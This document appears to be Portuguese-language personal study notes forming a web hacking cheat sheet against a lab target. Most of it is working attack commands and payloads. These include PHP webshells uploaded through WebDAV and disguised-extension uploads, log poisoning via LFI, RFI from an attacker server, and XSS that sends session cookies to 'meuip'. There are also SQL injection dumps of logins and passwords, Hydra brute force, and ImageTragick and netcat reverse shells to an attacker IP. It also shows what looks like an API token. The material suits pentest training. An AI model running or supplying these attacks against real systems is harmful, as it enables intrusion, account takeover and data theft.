WEB HACKING
========================================================================================================
Obs:
-  Documentar ips, arquivos, diretorios, metodos aceitos

VETORES DE ATAQUE
-  Campos de Busca
-  Campos de Login/autenticação/Registro/Cadastro
-  Redirecionamentos
-  Paramentros GET-POST
-  Dowloand/Upload
-  Posts


Instalar:
-  apt install gobuster (para brute force de diretorios)
-  extensão Foxyproxy Standard p/proxy (no firefox para funcionar tbm com burp)
-  extensão Cookie Manager(by rob w)

HTML
*alterar propriedades do corpo html, ex: input type="password" trocar para "text" irá mostrar senhas salvas *****
*inspecionar a pagina 

--------------------------------------------------------------------------------
-  MOZILLA OBSERVATORY

IDENTIFICANDO ARQUIVOS E DIRETORIOS
-   `gobuster dir -e -u http://ALVO/ -w /usr/share/wordlists/dirb/big.txt`   
-   `gobuster dir -e -u http://ALVO/turismo -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.sql,.bkp`  
     (personalizar o scan para determinado diretorio encontrado "turismo")


VISUALIZAR METODOS ACEITOS
-   `curl -v -X OPTIONS http://ALVO/(diretorios importantes)`
-   `nc -v ALVO 80 -C`
-   `PUT /webdav/teste.php HTTP/1.1 `
-   `Host: 172.16.1.10`
-   `curl -v -X POST http://ALVO/logs/ (ver diretorios bloqueados e Burlar autenticação via metodos)`


EXPLORANDO PUT E WEBDAV
*apos identificar o webdav tentar explorar (subir arquivo para o webserver)
-   `curl -v -X PUT -d "<?php system('id');?>" http://ALVO/webdav/teste.php `
-   `curl -v -X PUT -d "<?php system(\$_GET["teste"]); ?>" http://ALVO/webdav/shell.php`
    (ir na pagina e acessar o arquivo passando o paramentro: http://ALVO/webdav/shell.php?teste=id)`
    *pode inserir qualquer paramentro de chamada alem do id
-   `curl -v http://ALVO/webdav/ --upload-file shell.php`
-   `cadaver http://ALVO/webdav/   (tool pronta para ataque ao webdav)`
-   `davtest --url http://ALVO/webdav/ (tool automatizada)`


OPEN REDIRECT
*ver os direcionamentos da pagina ex: http://ALVO/turismo/redir.php? (com o mouse encima do link ou proxy)
-   `logo apos apontar para seu servidor fake, ou download arquivo`
*clonar a pagina e enviar o link modificado (vide aula poc paginas falsas)


OPEN REDIRECT CODIFICADO 
*verificar se o redirect vai codificado ex:http://ALVO/turismo/pages.php?page=bG9naW4ucGhw 
-   `echo "bG9naW4ucGhw" | base64 -d  (verificar o que aparece codificado)`
-   `echo "http://siteclonadoataque.com" | base64  (copiar o codigo e colar "subistituir" na pagina para testar) `


SQL INJECTION  (caso tenha vuln, pular para modulo de sqlInjection)
*primeiramente testar parametros errados p/ ver o erro retorno
-   `' or 2=2#`
-   `teste' or id=1#`

FPD | Path Traversal | Directory Traversal
*verificar erro no corpo html (ex: acessar caminho de banners, alertas etc)
*depois de encontrado testar diretorios (famoso /../../etc/passwd)  ALVO/turismo/logado.php?banners=/../  


LFI Local File Inclusion
-   `testar vuln LFI (...info.php?module=sobre.php) ver retorno de erro warning:include()`
-   `testar acesso aos diretorios (site=/../../etc/passwd%00)`


LFI - Infecção de Logs
*depois de identificado o LFI, verificar se visualiza o access log)
-   `(site=/../../../../var/log/apache2/access.log) `
  *criar arquivo shell.php
-   `nano shell.php`
-   `<?php system($_GET['teste']); ?>`
     *enviar o comando via netcat
-   `nc -v 172.16.1.10 80 -C  (esperar conectar 'connected to IP')`
-   `<?php system($_GET['teste']); ?>`
*apos enviado, realizar o teste
-   `site=/../../../../var/log/apache2/access.log&teste=id   (ou qualquer comando...ls -la, ifconfig etc)`


RFI - Remote File Inclusion
-   `nano testerfi.html  (inserir qualquer texto)`
-   `python -m SimpleHTTPServer 8080   (subir servidor na maquina atacante)`
*ir na pagina vuln e chamar seu ip atacante /testerfi.html
-   `ALVO/turismo/link.php?link=http://meuip:8080/testerfi`
*depois poderá ser inserido qualquer codigo, ex o shell.php, trocar para shell.html (mv shell.php shell.html) e subir na url
-   `ALVO/turismo/link.php?link=http://meuip:8080/shell&teste=id (ou qualquer comando...ls -la, ifconfig etc)`



HTML INJECTION 
*verificar em campos de busca
-   `<h1>teste</h1>`
-   `<form>LOGIN:<input type="text"></form>`
*depois de visto a vuln, utilizar apontando pra pagina falsa clone
-   `http://ALVO/turismo/procurar.php?busca=<a href="http://meuip/"><h1>CLIQUE AQUI</h1></a>`
  *sera exibido para clicar dentro da pagina e direcionado para pag falsa


XSS Reflected - https://github.com/payloadbox/xss-payload-list
*verificar em campos de busca ou na propria url self xss  (procurar dorks exemplos na internet)
-   `<script>alert("TESTE")</script>   (classico xss refletido)`
-   `<script>alert(document.cookie)</script>   (poderá ser inserido direto na url tbm)`
-   `<script>alert(document.location="http://meuip/virus.exe")</script> (ou final <%2Fscript>)`


XSS Stored: Sequestro sessão
*apos verificar xss armazenado, jogar payload no campo vulneravel,apontando para meu servidor afim de pegar o cookie de sessão
-   `python -m SimpleHTTPServer 8080   (subir servidor na maquina atacante ficar escutando)`
-   `<script>new Image().src="http://meuip:8080/?="+document.cookie;</script>`
*clicar para enviar no campo postagem o payload, e esperar os cookies de acesso, 
logo depois de capturar os cookies,usar o cookie com xss refletido 
*com cookie capturado trocar na url do navegar inserindo o cookie roubado
-   `http://ALVO/post.php?busca=<script>alert(document.cookie="PHPSESSID=0mbh182hhf9jjn182913h29bg")<%2Fscript>`
*depois acessar a area admin no mesmo navegador/sessao 
-   `http://ALVO/admin/`


XSS AUTOMATIZADO
*git clone https://github.com/s0md3v/XSStrike.git
-   `python3 xsstrike.py` 
-   `python3 xsstrike.py -u "http://ALVO/post.php?busca="  (ja com o possivel url vulneravel)`
-   `python3 xsstrike.py -u "http://ALVO/turimos/procurar.php" --params  (ele irá identificar as urls vulneraveis, mais eficiente)`
*estudar opçoes do programa


URL ENCODE
*codigo baseado no padrao ASCII para mudança dos caracteres (encodados pelo html) 
<?php
$hashtag = "#";
$e = "&";
$str = $_GET['char'];
echo rawurlencode($str) . "<br/>\n";
echo "Exibindo #: " . rawurlencode($hashtag) . "<br/>\n";
echo "Exibindo &: " . rawurlencode($e);
?>

==============================================================================================

**SQL INJECTION**

SQLi - Error Based
*verificar vetor de ataque, inserir aspas simples ' (na url)e ver error:sql syntax
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,3,4,5'
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,version(),user(),5'

SQLi - Information schema + DUMP
*depois de verificado a vuln error based
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,table_name,4,5 from information_schema.tables %23
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,table_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name=""%23 
*verificar a tabela para puxar as infos (dbmrtur, dbmrusers)
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,nome,login,senha from mrusers %23  (vai puxar as hashs de senhas da tabela users)
-   http://ALVO/turismo/agencias.php?loja=' union select 1,2,concat('Login=',login,'Senha=',senha),4,5 from mrusers %23   (vai mostrar user e pass texto claro)


SQLi - RCE
*executar comandos no servidor
-   http://ALVO/turismo/agencias.php?loja=' union all select 1,2,3,4,load_file("/etc/passwd") %23
*se existir bloqueio com \ (addslash) verificar aula bypass addslashes


SQLi - Blind POST Injection
testar as combinações para gerar erro:(1' and 1=1) (' or 1=1 union select 1,2#) 
-   abrir o burp, interceptar a requisição de login, depois em History->send to Repeater (enviar a requisição para o repeater para manipular strings)
-   Repeater-> no campo login,testar as logicas booleanas e verificar o erro no Response
(na barra inferior do Response, filtrar o campo onde tem a resposta, para agilizar ex: (testes ex: login:' or 2=2 #  ou  login:usuario' and 1=1#)

Ir testando no campo login no Repeater testar as combinações e ver o retorno no Reponse:
-   login:usuario' and database() = char(100,192,89,239) #    (as numerações sao baseadas na conversao binaria:Decimal da tabela ou banco de dados que queremos achar)
Usar o site: https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html (jogar no ascii text e ver em Decimal)
-   login:usuario' and length(database()) = 7 #  (ver o tamanho do nome 'n de caracteres' da base de dados, ir testando 1,2,3...geramente nomes apartir de 3..)
-   login:usuario' and ascii(substring(database(),1,1)) = 100 #  (ir testando as numeracoes decimais ascii uma a uma, 1,1 primeira casa. 2,1 segunda casa, até descobrir nome do banco)


SQLi - Blind Injection II
*explorando a vuln, testar as combinaçoes abaixo
-   login:usuario' and (select length(group_concat(table_name)) = 10 from information_schema.tables where table_schema="dbmrtur")#   (veremos o tamanho do agrupamento de tabelas)
*apos descoberto o tamanho, realizar os testes usando o site de conversao para achar as tabelas
-   login:usuario' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 100#
*apos descoberto as tabelas achar as colunas e ir testando uma por uma 1,1  2,1...
-   login:usuario' and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="dbmrtur" and table_name="adm"),1,1)) = 100#


SQLi - Time Based
*caso não funcione as vuln de logica booleana (no burp) utilizar o time based
*testar nas paginas identificadas, um a um como no exemplo acima, mas usando o sleep no final
-   cupom=' or if(length(database())=2, sleep(3),0) #    (envia o teste de comprimento da base, se retornar rapido é true, se demorar o tempo sleep é false)

--------------------------------------------------
SQL AUTOMATIZADO - SQLMAP
*automatiza todo os testes acima
*inserir no sqlmap o caminho(url) que esta vulneravel ou usar o NMAP
*se achar pagina de login, varrer com dirb o caminho, e scanear com o sqlmap
-   `nmap -sV --script=http-sql-injection PAGINAALVO.COM -p 80`
-   `sqlmap -u PAGINAALVO.COM/login.php --forms --dbs --batch (vai tentar achar user e senha)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" --dbs --batch (dbs: varre as bases batch: com comportamento padrao)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" -D dbmrtur --tables  (tras todas tabelas do banco encontrado)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" -D dbmrtur -T dbusers --columns  (tras as colunas da tabela)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" -D dbmrtur -T dbusers -C 'login,senha' --dump (mostra login e hashe das senhas, e pergunta/tenta quebrar com wordlist propria)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" --users (lista usuarios)`
-   `sqlmap -u "ALVO/turismo/agencias.php?loja=sp" --os-shell   (tenta subir uma shell)`
-   `sqlmap -u "ALVO/turismo/login.php" --forms  (url com metodo POST)`


====================================================================================

**TESTES COMPLETOS ADVANCED**


API TEST - Trick - 

*NA FASE DO BURP, REALIZAR AS MANIPULAÇÕES DAS REQUISIÇÕES - 
*GOLD TRICK -> Em action> Do Intercept > Response to this request (isso pegará apenas a reposta do server)
*Ataque que podera alterar uma user role para admin ou acessar areas indevidas (escalar priv baixa para alta), ou algo como IDOR.


*Sempre manipular os campos ID e numeros que possam acessar outro path ou info 
*Quando capturar um token JWT usar o jwt.io e tambem o cyberchef para analise, pegar a segunda parte do jwt (payload) e quebrar from base64
(obs se começar o trecho do payload do JWT com eyJ é um JSON)
-   `autentica, pega o token e joga no hashcat, manipular o token JWT trocando o payload por outro usuario (role:admin)`
-   `Testar OpenRedirect (quando for OAuth) e utilizar o webhook.site (irá gerar link unico onde será adicionado na vuln redirect da requisição)`
-   `Interceptar a resposta e tentar pegar o token code da request da API`
-   `Utilizar o cyberchef em URL Decode para verificar onde começa o redirect_uri `


Command Injection
*sempre pensar como um dev, testar os campos de envio (tanto get quanto post)
-ALVO/hosting/   (testar no campo de busca: ;ls -la;#)

Automatizar Command Injetion 
*utilizar o commix (verificar se o parametro é get ou post e o caminho vuln do campo de busca)
-   `commix --url http://ALVO/hosting/ --data="site=ALVO.com.br"   (encontrar o caminho vulneravel no caso site=  e passar qualquer consulta)`


Enumerar campos com Intruder
-   `encontrar campo que possa ser atacado com brute force(seja de usuario, lista de algo etc)`
-   `enviar pro intruder (send to Intruder) em proxy intercept, em positions marcar apenas a do campo selecionado pro brute`
-   `em payloads deixar set 1, payload type simple list, em options (load) uma wordlist especifica do campo que sera atacado, seja usuario, senha etc`
-   `verificar o retorno da pagina, ver padrão quando for true, para setar em Options-Grep Match, remove all, e add o padrao identificado de retorno da pagina`


Fuzzing com BURP
*identificar o campo que irá atacar, no burp enviar para o intruder, em positions (dar clear) selecionar apenas o campo a ser atacado(ex login) e add.
*em Payload carregar a wordlist especifica de fuzzing(usr/share/seclists/fuzzing/sqli/genericsqli
*em options->Grep - Match (limpa e add as palavras de retorno : incorreto, SQL, block, etc) depois atack
-   `aguardar, esperar aparecer uma requisiçao que nao deu match nas palavras add, e ver o retorno e o payload enviado, selecionar o payload enviado do campo para o (send to decoder) selecionar nele(decode as url)`
-   `depois copiar o payload SQLinjection e jogar no campo login e qualquer senha para dar bypass e logar`


Fuzzing BURP - para LFI
*URL com vuln ex no Burp->Intruder->Positions( GET /turismo/info.php?p=$sobre.php$  HTTP/1.1  selecionar o $sobre.php$)
*identificar url com possivel vuln, enviar para o intruder, limpar e selecionar a parte da url, depois carregar wordlist em payloads
*em Payload carregar a wordlist especifica de fuzzing(usr/share/seclists/fuzzing/LFI/LFI-LFISuite.pathtest.txt
-   `Ver os erros no Results e adicionar em Options Grep - Match (limpar os q estao e add os novos)`
*quem nao aparecer erro é o payload que funcionar (enviar para o deconde url, e usar na pagina original para testar)


Personalizar Regras no Intruder
*caso o parametro seja enviado encriptado (verificar no burp o envio de login e senha)
-   `enviar pro intruder, selecionar o campo, em payload setar 2 posicoes e cada uma carregar uma wordlist user e pass, ver se tem separator for postions
em payload processing, adicionar Encode->Base64-encode  start atack
Ataques BRUTE FORCE



BURP - Brute Force Intruder
*apos verificado que aplicação web nao bloqueia tentativas, jogar no BURP para ataques
-   `BURP->Proxy: Intercept -> send to Intruder-> em positions: clear e Add$ os 2 campos para ataque ->`
Attack Type: Cluster Bomb -> em payloads: payload set 1 (add o usuario 'ex:admin' ou lista) payload set 2, payload type: brute force -> em payload options setar: character set (letra e numero ou só um deles) e tamanho.


HYDRA - Brute Force
*verificar campos login e senha no corpo html, e mensagem de erro login/senha incorretos, se é GET ou POST (trocar em http form)
-   `hydra -v -L users.txt -P pass.txt ALVO http-post-form "/turismo/login.php:login=^USER^&senha=^PASS^&login:incorreto"`



SCAN com AUTORIZAÇÃO
*com usuario basico dentro da aplicação realizar scan com cookie usando gobuster
-   `gobuster dir -e -u IPaplicacao/ -w worlist -x .php -c "PHPSESSID=gh86iq0kdeane182n129bnv"`
*usar o curl -v em pagina com resposta 302 (redirecionamento) que força ir para outra
*Pode ser envido link malicioso e ficar escutando (nc -vnlp 8081) e pegar o cookie de sessao da pessoa


FILE DISCLOSURE
-   explorar pagina com burp, alterando as requisições afim de localizar paginas 'hidden'
-   alterar as requisições, ver se esta encodado base64 e trocar e reenviar no burp ou em storage->value em inspetor de elemento do navegador


Explorando Inputs UPLOADS
*localizar campo de envio de arquivo (verificar se é get ou post)
*se tiver bloqueio de extensao, usar metodos de case sensitive ou tentar modificar o arquivo para bypass upload (.pHp,modificar o .htacess, modificar o php para pdf)
*criar script .php

nano haqui.php 
<?php 
system($_POST['hack']);
?>

*enviar depois inspecionar corpo html e ver o caminha que é enviado (ex no corpo html: Upload ok <a href="/_old/upload/haqui.php"></a><!--include($_POST['page']);...>)
*no terminal chamar o curl com a pagina e caminho do upload para subir a shell
-   `curl http://ALVO/_old/upload/haqui.php -d "haqui=id"  ou "haqui=pwd"  "haqui=ls"  ("haqui=whereis nc"  verificar se tem o nc pra chamar shell reverso)`
*se tiver o netcat abrir e escutar na porta local para conexao reversa
-   `nc -vnlp 443   (em outro terminal)`
-   `curl http://172.30.0.40/_old/upload/haqui.php -d "haqui=/bin/nc MEUIPLOCAL 443 -e /bin/sh" (ou /bin/bash)`
*retornar ao terminal do netcat e dar um id 



BYPASS FILE UPLOAD
*modificar o script haqui.php para burlar o upload, modificando o cabeçalho para forjar extensao PDF
-   `head -n 1 haqui.php`
haqui.php: PHP script, ASCII text
-   `mv haqui.php haqui.php.pdf`
-   `nano haqui.php.pdf`

nano haqui.php 
%PDF-1.5
<?php 
system($_POST['hack']);
?>

*logo apos fazer o upload do arquivo haqui.php.pdf e usar a falha LFI para chamar o arquivo na URL
*verificar o caminho do upload (ALVO/index.php?page=uploads/haqui.php.pdf%00&hack=id) ou qualquer comando hack=ls -la etc



FILE UPLOAD IMAGENS
*criar arquivo com codigo baseado na vulnerabilidade imagetragick e fazer upload

nano comp.jpg
push grafic-context
viewbox 0 0 640 480 
fill 'url(https://";sleep "10)'
pop graphic-context

*subir server local para escutar
python3 -m http.server 80
*alterar o para o ip da usa maquina local

nano comp.jpg
push grafic-context
viewbox 0 0 640 480 
fill 'url(https://";wget http://IPatacante/test")'
pop graphic-context

*caso funcione, enviar o netcat para receber a conexao reversa
nc -vnlp 443

nano comp.jpg
push grafic-context
viewbox 0 0 640 480 
fill 'url(https://";nc -e /bin/bash IPatacante 443")'
pop graphic-context
*logo apos enviar o arquivo e esperar a conexao reversa no netcat



PHP WRAPPERS
*verificar diretorio vulneravel com retorno de erro ' (warning) sempre olhar no corpo html se aparece o erro
*usar os codigos de referencia do php wrappers para conseguir a vuln em paginas php
http://ALVO.com.br/index.php?page=data://text/plan,<?php system(id);?>   (dentro de id pode passar qualquer comando, ls, pwd etc)
*se funcionar trocar chamando a shell php no lugar <?php system($_GET['hack']);?>  (se aparecer erro chamar na url (&hack=id))

*se nao funcionar testar encondando em base64   
http://ALVO.com.br/index.php?page=data://text/plan;base64,(palavra encodada em base64)
ir no terminal:-echo -n '<?php system(id);?>' | base64
                 -PD9waHAgc3lzdGVtKGlkKTs/Pg==  
*se funcionar chamar shell via get encodada tbm
-echo -n '<?php system($_GET['hack']);?>' | base64
  -PD9waHAgc3lzdGVtKCRfR0VUW2hhY2tdKTs/Pg==
http://teste.com.br/index.php?page=data://text/plan;base64,PD9waHAgc3lzdGVtKCRfR0VUW2hhY2tdKTs/Pg==&hack=id



JOOMLA 
*ver video, porem pode ser automatizado usando o joomscan do kali + sqlmap


PHPMailer
*verificar a versão e procurar exploitdb o exploit 



PENTEST WEB - WORDPRESS

Usar o gobuster para varrer os diretorios na pagina e explorar
*site referencia de vuln (wpvulndb.com) cadastrar no site para obter o token de API gratuita 50requests
-   `wpscan --url teste.com/blog  (scan basico)`
-   `wpscan --url teste.com/blog --api-token me1k23n3iCNK1234Jasjfnas189hAF12   (scan completo com token)`
*Apos identificar plugins vulneraveis utilizar subcomandos `
-   `wpscan --url teste.com/blog --api-token me1k23n3iCNK1234Jasjfnas189hAF12 --enumerate p --plugins-detection aggressive`
-   `wpscan --url teste.com/blog --api-token me1k23n3iCNK1234Jasjfnas189hAF12 --enumerate vp --plugins-detection aggressive `
(vp para plugins vulneraveis ou vt para temas vulneraveis)
*apos encontrado o plugin vuln, procurar no exploidb e explorar

extras:
git clone https://github.com/shawarkhanethicalhacker/D-TECT


















